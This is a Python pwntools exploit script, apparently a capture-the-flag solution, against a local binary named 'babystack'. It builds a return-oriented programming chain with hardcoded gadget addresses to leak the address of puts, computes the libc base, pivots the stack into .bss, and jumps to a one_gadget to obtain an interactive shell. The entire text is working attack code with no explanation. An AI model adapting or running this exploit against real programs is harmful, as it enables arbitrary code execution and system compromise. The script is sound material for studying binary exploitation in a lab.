from pwn import *
p = process("./babystack")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elf = ELF("./babystack")

def rop(p1,ret):
	offset = -(0x7ffff77edf30 - 0x7ffff77ef728)-8
	p.sendlineafter("send?\n",str(offset))
	print str(offset)
	payload = "a"*0x1008 + "b"*8 + "junkjunk" + p64(pop_rdi_ret) + p64(p1) + p64(ret)
	payload += p64(pop_rdi_ret) + p64(0)
	payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) + p64(read_plt)
	payload += p64(pop_rsp_r13_r14_r15_ret) + p64(bss_addr)
	payload = payload.ljust(offset-8,"a") + "b"*8
	p.send(payload)
	#print payload
	
#gdb.attach(p,"b *0x00000000004009E7\nb *0x0000000000400A38\nb *0x0000000000400A2E")
#context.log_level = "debug"
pop_rdi_ret = 0x0000000000400c03
pop_rsi_r15_ret = 0x0000000000400c01
pop_rsp_r13_r14_r15_ret = 0x0000000000400bfd
bss_addr = 0x0000000000602010 + 0x100
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
read_plt = elf.plt["read"]
#gdb.attach(p)
info = rop(puts_got,puts_plt)
p.recvuntil("It's time to say goodbye.\n")
info = p.recvline().strip("\n").ljust(8,"\x00")
#return info
print info,len(info)
puts_addr = u64(info)
log.success("puts_addr:"+hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
one_gadget = libc.address + 0x4526a
payload2 = p64(0)*3 + p64(one_gadget) + "\x00"*50
p.send(payload2)
#gdb.attach(p)
p.interactive()
